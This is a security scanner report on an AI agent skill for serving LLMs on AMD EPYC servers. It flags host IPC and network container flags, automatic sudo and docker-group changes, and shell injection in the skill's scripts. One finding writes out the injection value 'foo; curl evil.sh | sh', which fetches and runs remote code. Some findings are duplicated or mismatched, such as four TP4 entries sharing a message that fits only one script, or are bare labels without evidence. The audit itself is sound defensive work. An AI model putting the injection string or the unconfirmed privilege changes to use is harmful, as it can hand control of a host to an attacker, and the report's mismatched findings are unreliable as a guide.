# SkillSpector Security Report

**Skill:** serving-llms-on-epyc  
**Source:** `/Users/kmittal/Code/GTM/amd-skills/skills/serving-llms-on-epyc`  
**Scanned:** 2026-09-08 18:48:02 UTC  

## Risk Assessment

| Metric | Value |
|--------|-------|
| Score | 100/100 |
| Severity | CRITICAL |
| Recommendation | DO NOT INSTALL |

## Components (11)

| File | Type | Lines | Executable |
|------|------|-------|------------|
| `SKILL.md` | markdown | 374 | No |
| `data/epyc.json` | json | 52 | No |
| `evals/evals.json` | json | 61 | No |
| `evals/machine.yml` | yaml | 1 | No |
| `reference.md` | markdown | 213 | No |
| `scripts/check_model.py` | python | 272 | Yes |
| `scripts/cpu_tune.py` | python | 228 | Yes |
| `scripts/detect.py` | python | 171 | Yes |
| `scripts/estimate_memory.py` | python | 138 | Yes |
| `scripts/validate.py` | python | 266 | Yes |
| `skill-card.md` | markdown | 13 | No |

## Issues (44)

### 🔴 HIGH: TP4

**Location:** `SKILL.md:1`  
**Confidence:** 90%  

**Message:** This finding points out that the code accepts `--generation` as input rather than detecting it, does not check model support or RAM fit (only a fixed 32GB threshold), lacks thread/KV/NUMA sizing, plan confirmation, launch, and endpoint verification. These are core steps described in the skill. Without these, the agent may rely on incorrect assumptions (e.g., the host has enough memory for a specific model, or that the chosen model is supported by zentorch) and could start a service that fails or behaves unpredictably. The lack of endpoint verification means the agent cannot confirm the service is secure or operational. This could lead to the exposure of an unvalidated or misconfigured endpoint, potentially a security risk. The intent is likely negligent (an incomplete script) rather than malicious, but the description’s overpromise makes it a hazardous trust issue.

**Remediation:** Implement the missing checks (EPYC generation detection, model support lookup, RAM fit against model size, thread/KV/NUMA sizing, plan confirmation, launch, and endpoint verification) or clearly mark the script as a partial utility. Add explicit stop conditions for unsupported hardware or models. Update the skill description to list only the capabilities that are actually implemented.

**Evidence:**
- **actual_behavior_summary:** `The provided code (scripts/check_model.py) is a standalone utility that checks whether a given Hugging Face model is supported by vLLM for generation endpoints. It fetches the model's config.json and vLLM's registry to determine support, inspects chat template availability, and outputs JSON with support status. It does not perform any EPYC-specific detection, runtime validation, resource sizing, launching, or endpoint verification.`
- **code_end_line:** `272`
- **code_path:** `scripts/check_model.py`
- **code_start_line:** `1`

---

### 🔴 HIGH: TP4

**Location:** `SKILL.md:1`  
**Confidence:** 95%  

**Message:** This finding points out that the code accepts `--generation` as input rather than detecting it, does not check model support or RAM fit (only a fixed 32GB threshold), lacks thread/KV/NUMA sizing, plan confirmation, launch, and endpoint verification. These are core steps described in the skill. Without these, the agent may rely on incorrect assumptions (e.g., the host has enough memory for a specific model, or that the chosen model is supported by zentorch) and could start a service that fails or behaves unpredictably. The lack of endpoint verification means the agent cannot confirm the service is secure or operational. This could lead to the exposure of an unvalidated or misconfigured endpoint, potentially a security risk. The intent is likely negligent (an incomplete script) rather than malicious, but the description’s overpromise makes it a hazardous trust issue.

**Remediation:** Implement the missing checks (EPYC generation detection, model support lookup, RAM fit against model size, thread/KV/NUMA sizing, plan confirmation, launch, and endpoint verification) or clearly mark the script as a partial utility. Add explicit stop conditions for unsupported hardware or models. Update the skill description to list only the capabilities that are actually implemented.

**Evidence:**
- **actual_behavior_summary:** `A standalone Python script that derives vLLM CPU tuning parameters (OMP thread binding, KV cache size, and socket pinning commands) for a single socket. It only reads system topology and emits environment variables/commands; it does not launch, verify, or perform any model serving.`
- **code_end_line:** `228`
- **code_path:** `scripts/cpu_tune.py`
- **code_start_line:** `1`

---

### 🔴 HIGH: TP4

**Location:** `SKILL.md:1`  
**Confidence:** 95%  

**Message:** This finding points out that the code accepts `--generation` as input rather than detecting it, does not check model support or RAM fit (only a fixed 32GB threshold), lacks thread/KV/NUMA sizing, plan confirmation, launch, and endpoint verification. These are core steps described in the skill. Without these, the agent may rely on incorrect assumptions (e.g., the host has enough memory for a specific model, or that the chosen model is supported by zentorch) and could start a service that fails or behaves unpredictably. The lack of endpoint verification means the agent cannot confirm the service is secure or operational. This could lead to the exposure of an unvalidated or misconfigured endpoint, potentially a security risk. The intent is likely negligent (an incomplete script) rather than malicious, but the description’s overpromise makes it a hazardous trust issue.

**Remediation:** Implement the missing checks (EPYC generation detection, model support lookup, RAM fit against model size, thread/KV/NUMA sizing, plan confirmation, launch, and endpoint verification) or clearly mark the script as a partial utility. Add explicit stop conditions for unsupported hardware or models. Update the skill description to list only the capabilities that are actually implemented.

**Evidence:**
- **actual_behavior_summary:** `A standalone detection script that queries lscpu and /proc/meminfo to output JSON with CPU model, EPYC generation, core counts, memory, and AVX-512 support. It does not serve, validate, size, launch, or verify anything.`
- **code_end_line:** `171`
- **code_path:** `scripts/detect.py`
- **code_start_line:** `1`

---

### 🔴 HIGH: TP4

**Location:** `SKILL.md:1`  
**Confidence:** 95%  

**Message:** This finding points out that the code accepts `--generation` as input rather than detecting it, does not check model support or RAM fit (only a fixed 32GB threshold), lacks thread/KV/NUMA sizing, plan confirmation, launch, and endpoint verification. These are core steps described in the skill. Without these, the agent may rely on incorrect assumptions (e.g., the host has enough memory for a specific model, or that the chosen model is supported by zentorch) and could start a service that fails or behaves unpredictably. The lack of endpoint verification means the agent cannot confirm the service is secure or operational. This could lead to the exposure of an unvalidated or misconfigured endpoint, potentially a security risk. The intent is likely negligent (an incomplete script) rather than malicious, but the description’s overpromise makes it a hazardous trust issue.

**Remediation:** Implement the missing checks (EPYC generation detection, model support lookup, RAM fit against model size, thread/KV/NUMA sizing, plan confirmation, launch, and endpoint verification) or clearly mark the script as a partial utility. Add explicit stop conditions for unsupported hardware or models. Update the skill description to list only the capabilities that are actually implemented.

**Evidence:**
- **actual_behavior_summary:** `The code is a standalone validation script (validate.py) that checks container runtime availability, probes the selected environment for vLLM/zentorch/torch versions and platform, applies a Venice stack-compatibility gate, checks LD_PRELOAD libraries, HF_TOKEN, and RAM. It outputs a JSON report and exits with status based on error severity. It does not detect EPYC generation (takes it as input), does not check model support, does not size threads/KV/NUMA, does not confirm a plan, does not launch a service, and does not verify an endpoint.`
- **code_end_line:** `266`
- **code_path:** `scripts/validate.py`
- **code_start_line:** `1`

---

### 🔴 HIGH: PE5

**Location:** `SKILL.md:214`  
**Confidence:** 80%  

**Message:** The container run uses `--ipc=host` and `--network=host`. While these are not true container escape primitives, they significantly increase the attack surface: the container shares the host's IPC namespace and network stack. If the container image is compromised or runs untrusted code, it could interact with host IPC objects (e.g., shared memory) and access network services on the host without network isolation. The skill also passes an `HF_TOKEN` environment variable, which would be exposed to the container. The skill does not indicate the image is verified, and the agent pulls it automatically. The flags are common for vLLM performance, but the risk is non-trivial.

**Remediation:** Avoid `--ipc=host` when possible; use `--shm-size` to provide adequate shared memory instead. If `--network=host` is required for the endpoint, consider documenting the risk and restricting the container with `--cap-drop=ALL`, running as a non-root user, and validating the image digest. Additionally, ensure the user is explicitly warned about the host namespace sharing before launch.

---

### 🔴 HIGH: PE5

**Location:** `SKILL.md:352`  
**Confidence:** 80%  

**Message:** The skill recommends using `--ipc=host` to solve the small `/dev/shm` size in containers. This flag shares the host's IPC namespace with the container, allowing the container to access host shared memory segments, semaphores, and message queues. If the container is compromised (e.g., a malicious model, a vulnerable vLLM dependency, or an attacker who gains code execution), it could potentially interact with host processes or read sensitive data from `/dev/shm`. This is a real container‑isolation risk. The skill explicitly warns against combining `--ipc=host` with `--shm-size`, and suggests that if IPC isolation is desired, `--shm-size=16g` should be used instead. However, the primary recipe still uses `--ipc=host`, which is the less secure option. The intent is benign – it is a practical workaround for vLLM's large shared‑memory requirement – but the security posture is weaker than necessary.

**Remediation:** Prefer the safer alternative: use the default or a private IPC namespace and set `--shm-size=16g` (or a value appropriate to the model) instead of `--ipc=host`. If `--ipc=host` must be used, ensure the container image is trusted, the model weights are verified, and the host has no other sensitive processes sharing the same IPC namespace. For multi‑tenant or untrusted environments, avoid `--ipc=host` entirely.

---

### 🔴 HIGH: PE5

**Location:** `SKILL.md:354`  
**Confidence:** 80%  

**Message:** This finding is a continuation of the same `--ipc=host` recommendation found at line 352. The line further explains the consequences of combining `--ipc=host` with `--shm-size` in Podman. The security risk is identical: using the host IPC namespace weakens container isolation and can expose host shared memory. The skill’s own warning about the conflict shows that the author is aware of the trade‑off, and the skill does offer the safer `--shm-size=16g` path. Nevertheless, the baseline recipe still opts for `--ipc=host`, which is a high‑risk configuration when the container runs untrusted code or models. The intent is benign – the goal is to avoid vLLM crashing due to insufficient `/dev/shm` – but the impact could be significant if the container is breached.

**Remediation:** Same as line 352: use `--shm-size=16g` with an isolated IPC namespace instead of `--ipc=host`. If `--ipc=host` is unavoidable, document the risk and ensure the host and container are both fully trusted. Never use `--ipc=host` when running untrusted model artifacts or third‑party plugins.

---

### 🔴 HIGH: PE5

**Location:** `SKILL.md:357`  
**Confidence:** 80%  

**Message:** Privileged Container / Container Escape

**Remediation:** Review the flagged content for security risks. Ensure no credentials, secrets, or sensitive data are exposed.

---

### 🔴 HIGH: PE5

**Location:** `data/epyc.json:8`  
**Confidence:** 80%  

**Message:** Privileged Container / Container Escape

**Remediation:** Review the flagged content for security risks. Ensure no credentials, secrets, or sensitive data are exposed.

---

### 🔴 HIGH: PE5

**Location:** `data/epyc.json:13`  
**Confidence:** 80%  

**Message:** Privileged Container / Container Escape

**Remediation:** Review the flagged content for security risks. Ensure no credentials, secrets, or sensitive data are exposed.

---

### 🔴 HIGH: PE5

**Location:** `data/epyc.json:14`  
**Confidence:** 80%  

**Message:** Privileged Container / Container Escape

**Remediation:** Review the flagged content for security risks. Ensure no credentials, secrets, or sensitive data are exposed.

---

### 🔴 HIGH: PE5

**Location:** `data/epyc.json:9`  
**Confidence:** 80%  

**Message:** Privileged Container / Container Escape

**Remediation:** Review the flagged content for security risks. Ensure no credentials, secrets, or sensitive data are exposed.

---

### 🔴 HIGH: PE5

**Location:** `data/epyc.json:15`  
**Confidence:** 80%  

**Message:** Privileged Container / Container Escape

**Remediation:** Review the flagged content for security risks. Ensure no credentials, secrets, or sensitive data are exposed.

---

### 🔴 HIGH: AR2

**Location:** `SKILL.md:97`  
**Confidence:** 80%  

**Message:** Anti-Refusal Statement

**Remediation:** Remove instructions that suppress warnings, disclaimers, or ethical commentary. Let the agent surface safety-relevant caveats to the user.

---

### 🔴 HIGH: AR2

**Location:** `reference.md:50`  
**Confidence:** 80%  

**Message:** Anti-Refusal Statement

**Remediation:** Remove instructions that suppress warnings, disclaimers, or ethical commentary. Let the agent surface safety-relevant caveats to the user.

---

### 🔴 HIGH: PE5

**Location:** `reference.md:90`  
**Confidence:** 80%  

**Message:** The `--ipc=host` flag shares the host's IPC namespace with the container. If the container is compromised (e.g., via a malicious model or runtime exploit), an attacker can access host IPC mechanisms (shared memory, semaphores, message queues) and potentially escape the container or interact with other host processes. The skill uses this flag to provide vLLM workers with a large /dev/shm, but this is a security trade-off. The skill does document an alternative (`--shm-size=16g`) but the base recipe defaults to the riskier option. Given that the container may execute arbitrary model weights and code, this is a genuine risk.

**Remediation:** Avoid `--ipc=host` by default. Use `--shm-size=16g` (or a suitable value) to allocate shared memory inside the container. If `--ipc=host` is necessary, explicitly warn the user about the security implications and ensure the container runs with the least privileges (non-root, seccomp, etc.). Consider dropping this flag entirely and relying on `--shm-size`.

---

### 🔴 HIGH: PE5

**Location:** `reference.md:91`  
**Confidence:** 80%  

**Message:** Duplicate of the `--ipc=host` finding on line 90. The same security risk applies: host IPC namespace exposure. The context in this line reinforces that the base recipe uses `--ipc=host`, making it a systemic choice rather than an isolated occurrence.

**Remediation:** Same as above: prefer `--shm-size` and avoid host IPC. If kept, ensure explicit user consent and strong container isolation (user namespaces, non-root, read-only rootfs).

---

### 🔴 HIGH: PE5

**Location:** `reference.md:92`  
**Confidence:** 80%  

**Message:** The `--network=host` flag places the container directly on the host network stack, granting full access to all host network interfaces, ports, and services. If the container is compromised, an attacker can sniff traffic, scan internal networks, or launch attacks from the host's IP. The skill uses this for convenience (exposing the served port), but the safer alternative is `-p <port>:<port>`. This is a standard high-risk container configuration and a true security concern.

**Remediation:** Replace `--network=host` with explicit port mapping using `-p` (e.g., `-p 8000:8000`). This limits the container's network exposure to only the specified port. If `--network=host` is required for performance reasons, document the risk and restrict the container's other capabilities (e.g., no privileged mode, seccomp, and minimal Linux capabilities).

---

### 🔴 HIGH: PE5

**Location:** `reference.md:193`  
**Confidence:** 80%  

**Message:** The skill recommends `--ipc=host` to avoid `/dev/shm` size limits. This flag places the container in the host's IPC namespace, allowing the container to access host `/dev/shm`, System V shared memory, and other IPC primitives. A compromised or malicious container could read/write shared memory segments used by other host processes, potentially leaking sensitive data or causing denial-of-service. While not a full container escape, it significantly weakens isolation and is considered a privileged-container risk.

**Remediation:** Replace `--ipc=host` with `--shm-size=16g` as the default approach. If `--ipc=host` must be used, add a clear warning about its security implications, require explicit opt-in, and run the container with the least privilege possible (non-root user, dropped capabilities, seccomp/AppArmor).

---

### 🔴 HIGH: PE5

**Location:** `reference.md:194`  
**Confidence:** 80%  

**Message:** The same `--ipc=host` recommendation is reiterated in the warning about not combining it with `--shm-size`. The repetition reinforces the use of an insecure Docker/Podman flag. The host IPC namespace is exposed, which can allow a container process to interact with host shared memory and IPC queues, increasing the attack surface and enabling cross-process data leakage or interference.

**Remediation:** Avoid `--ipc=host` entirely. Use `--shm-size` with a sufficient value (e.g., `16g`) instead. If `--ipc=host` is considered necessary for performance, document the risk and provide a secure alternative, such as running with a dedicated IPC namespace and increasing `/dev/shm` via `--shm-size`.

---

### 🔴 HIGH: PE5

**Location:** `reference.md:196`  
**Confidence:** 80%  

**Message:** The skill text explicitly states that dropping `--ipc=host` would require `--shm-size=16g`, implying that `--ipc=host` is the preferred default. This is a security concern because `--ipc=host` grants the container access to the host's IPC namespace, which is a known dangerous configuration in container platforms. If the container workload is untrusted (e.g., a model or code from a third party), this could lead to unauthorized access to host memory segments or inter-process communication channels.

**Remediation:** Make `--shm-size=16g` the default and recommended option. If `--ipc=host` is used, it should be behind an explicit flag requiring user consent and accompanied by a security warning. Additionally, ensure the container runs with a non-root user and restrictive security profiles to minimize the impact of a compromise.

---

### 🔴 HIGH: LP1

**Location:** `scripts/check_model.py:1`  
**Confidence:** 75%  

**Message:** Code capability 'env' detected in scripts/check_model.py but not covered by declared permissions.

**Remediation:** Add a tool that covers the 'env' capability to the 'allowed-tools' frontmatter field in SKILL.md, or remove the code that requires it.

---

### 🔴 HIGH: LP1

**Location:** `scripts/check_model.py:1`  
**Confidence:** 75%  

**Message:** Code capability 'network' detected in scripts/check_model.py but not covered by declared permissions.

**Remediation:** Add a tool that covers the 'network' capability to the 'allowed-tools' frontmatter field in SKILL.md, or remove the code that requires it.

---

### 🔴 HIGH: TM1

**Location:** `scripts/cpu_tune.py:53`  
**Confidence:** 90%  

**Message:** Tool Parameter Abuse

**Remediation:** Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.

---

### 🔴 HIGH: TM1

**Location:** `scripts/detect.py:42`  
**Confidence:** 90%  

**Message:** Tool Parameter Abuse

**Remediation:** Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.

---

### 🔴 HIGH: TM1

**Location:** `scripts/validate.py:57`  
**Confidence:** 90%  

**Message:** This is a more specific classification of the same issue as AST4: the tool invocation uses `subprocess.run(cmd, shell=True)` with untrusted input incorporated into the command string. The script may be invoked by an agent with parameters derived from user requests, so an attacker could influence `--image` and inject shell commands. The severity is HIGH because the script is designed to run in a privileged Docker context and may have access to sensitive environment variables (e.g., `HF_TOKEN`) and the underlying host.

**Remediation:** Refactor `_sh` to accept a list of arguments rather than a shell string. For the Docker/Podman commands, use list form such as `subprocess.run([runtime, "run", "--rm", image, "python", "-c", PROBE])`. Also validate and sanitize all user-provided inputs before they are used in any command.

---

### 🔴 HIGH: YR1

**Location:** `scripts/validate.py:244`  
**Confidence:** 75%  

**Message:** YARA rule 'backdoor_persistence': Backdoor persistence with malicious payloads (shell commands, SSH key injection, hidden root users) [malware]

**Remediation:** Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.

---

### 🟡 MEDIUM: EA2

**Location:** `SKILL.md:212`  
**Confidence:** 80%  

**Message:** Autonomous Decision Making

**Remediation:** Add human-in-the-loop confirmation for destructive, irreversible, or high-impact operations. Never auto-execute commands that modify files, send data, or alter system state.

---

### 🟡 MEDIUM: E1

**Location:** `SKILL.md:254`  
**Confidence:** 60%  

**Message:** External Transmission

**Remediation:** Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.

---

### 🟡 MEDIUM: E1

**Location:** `SKILL.md:296`  
**Confidence:** 60%  

**Message:** External Transmission

**Remediation:** Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.

---

### 🟡 MEDIUM: EA2

**Location:** `evals/evals.json:6`  
**Confidence:** 75%  

**Message:** Autonomous Decision Making

**Remediation:** Add human-in-the-loop confirmation for destructive, irreversible, or high-impact operations. Never auto-execute commands that modify files, send data, or alter system state.

---

### 🟡 MEDIUM: PE2

**Location:** `reference.md:71`  
**Confidence:** 75%  

**Message:** The skill selects `sudo docker` as a runtime if passwordless sudo is available, and then drives all Docker commands (pull, run, stats, logs) with root privileges. This grants the agent root-level execution on the host without per-command user confirmation. While the skill is likely intended to simplify unattended operation, it expands the attack surface: if a model name, path, or other input is crafted maliciously, the agent could execute arbitrary Docker commands as root.

**Remediation:** Prefer non-root runtimes (podman, conda). If sudo is unavoidable, require explicit user confirmation before executing any sudo command and sanitize all inputs that are interpolated into Docker commands.

---

### 🟡 MEDIUM: PE2

**Location:** `reference.md:72`  
**Confidence:** 75%  

**Message:** This line is a continuation of the `sudo docker` runtime selection, reinforcing that the agent will run as root via passwordless sudo. It duplicates the risk of the previous finding: root-level Docker commands executed automatically. The same remediation applies.

**Remediation:** Same as PE2 at line 71: avoid automatic sudo usage or require explicit user approval.

---

### 🟡 MEDIUM: SDI-2

**Location:** `reference.md:77–81`  
**Confidence:** 85%  

**Message:** The skill instructs the agent to run `sudo usermod -aG docker $USER && newgrp docker` as a 'one-time setup fix'. This modifies the user's group membership, granting access to the `docker` group, which is equivalent to root privileges (Docker daemon access allows full host control). The manifest does not mention such account changes, and the skill appears to execute this without explicit user confirmation. If the agent is compromised or the skill is misused, this could silently escalate privileges or alter system configuration.

**Remediation:** Do not automatically modify user groups. Instead, require explicit user consent before any sudo/account modification, or direct the user to run the command manually. Prefer non-privileged runtimes (podman, conda) or use `sudo docker` only with per-command confirmation.

---

### 🟡 MEDIUM: PE2

**Location:** `reference.md:78`  
**Confidence:** 90%  

**Message:** This is the `sudo usermod` command itself, which modifies the user's group membership to add them to the `docker` group. As noted, Docker group membership is a root-equivalent privilege. This is a persistent system change and should never be performed without explicit user consent. The skill presents it as a 'one-time onboarding' but does not include a confirmation gate, increasing the risk of unintended privilege escalation.

**Remediation:** Remove this action from the skill. If needed, instruct the user to run the command manually and confirm completion. Never let the agent alter user accounts or groups automatically.

---

### 🟡 MEDIUM: AST4

**Location:** `scripts/check_model.py:177–178`  
**Confidence:** 70%  

**Message:** subprocess module call

**Remediation:** Use subprocess.run() with shell=False and an explicit argument list. Validate all inputs and avoid passing user-controlled data to commands.

---

### 🟡 MEDIUM: AST4

**Location:** `scripts/cpu_tune.py:53–54`  
**Confidence:** 70%  

**Message:** subprocess module call

**Remediation:** Use subprocess.run() with shell=False and an explicit argument list. Validate all inputs and avoid passing user-controlled data to commands.

---

### 🟡 MEDIUM: AST4

**Location:** `scripts/detect.py:42–43`  
**Confidence:** 70%  

**Message:** subprocess module call

**Remediation:** Use subprocess.run() with shell=False and an explicit argument list. Validate all inputs and avoid passing user-controlled data to commands.

---

### 🟡 MEDIUM: AST4

**Location:** `scripts/detect.py:49–50`  
**Confidence:** 70%  

**Message:** subprocess module call

**Remediation:** Use subprocess.run() with shell=False and an explicit argument list. Validate all inputs and avoid passing user-controlled data to commands.

---

### 🟡 MEDIUM: TT2

**Location:** `scripts/detect.py:49–50`  
**Confidence:** 65%  

**Message:** Tainted flow: 'ssh' from os.environ.get (line 46, credential/environment) → subprocess.run (code execution)

**Remediation:** Validate tainted variables before passing them to sinks. Use allowlists, type checks, or sanitization functions on data from external sources.

---

### 🟡 MEDIUM: AST4

**Location:** `scripts/validate.py:57–58`  
**Confidence:** 80%  

**Message:** The `_sh` helper uses `subprocess.run(cmd, shell=True)` with `cmd` built via f-strings from user-supplied `--image` and derived `repo`. For example, `_sh(f"{runtime} images {repo} --format ...")` and `_probe_stack(f"{runtime} run --rm {args.image} ", "container")` insert raw input into a shell command. A malicious `--image` value such as `foo; curl evil.sh | sh` would execute arbitrary commands on the host. Because the script is intended to run as part of a system administration skill, it may run with Docker group privileges (equivalent to root) and can access `HF_TOKEN`, model files, and the host filesystem. This is a classic command injection flaw.

**Remediation:** Avoid `shell=True` entirely by using list-form subprocess calls (e.g., `subprocess.run(["docker", "run", "--rm", image, ...])`). If shell must be used, pass all variable components through `shlex.quote()`. Additionally, validate `--image` against an allowlist or regex that permits only image names, tags, and digests, and reject shell metacharacters.

---

### 🟡 MEDIUM: RP1

**Location:** `scripts/validate.py:89`  
**Confidence:** 75%  

**Message:** Docker image referenced without tag or digest: 'docker run --rm'.

**Remediation:** Pin the image: image:tag or image@sha256:abc123

---

### 🟡 MEDIUM: PE2

**Location:** `scripts/validate.py:161`  
**Confidence:** 70%  

**Message:** Sudo/Root Execution

**Remediation:** Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.

---

### 🟢 LOW: PE1

**Location:** `scripts/validate.py:69`  
**Confidence:** 80%  

**Message:** Excessive Permissions

**Remediation:** Request only the minimum permissions required. Document why each permission is needed. Remove broad permissions like '*' or 'all'.

---

## Inspection Completeness

| Metric | Value |
|--------|-------|
| Execution | successful |
| Status | partial |
| Coverage | 90.9% |
| Fully inspected | 10 |
| Partially inspected | 1 |
| Entirely uninspected | 0 |

### Ledger Exceptions

| Reason / Status | Location | Details |
|-----------------|----------|---------|
| static_parse_limit | `SKILL.md` | A security-relevant expression exceeded a bounded static parser's span limit. |
| reference_unresolved | `SKILL.md:8-8` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:19-19` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:52-52` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:61-61` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:68-68` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:78-78` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:80-80` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:88-88` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:92-92` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:95-95` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:97-97` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:107-107` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:110-110` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:119-119` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:121-121` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:128-128` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:131-131` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:137-137` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:151-151` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:152-152` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:177-177` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:179-179` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:190-190` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:224-224` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:262-262` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:266-266` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:270-270` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:275-275` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:296-296` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:300-300` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:302-302` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:322-322` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:329-329` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:332-332` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:338-338` | A local path-like reference could not be resolved unambiguously. |
| reference_unresolved | `SKILL.md:361-361` | A local path-like reference could not be resolved unambiguously. |

### Analyzer Statuses

| Reason / Status | Location | Details |
|-----------------|----------|---------|
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| no_applicable_files | `` | No files matched this analyzer's applicability contract. |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| completed | `` |  |
| degraded | `` |  |
| completed | `` |  |

### Limitations

- Analyzer static_patterns_tool_misuse status: degraded.

## Metadata

- **Executable Scripts:** Yes

*Generated by SkillSpector v2.11.0*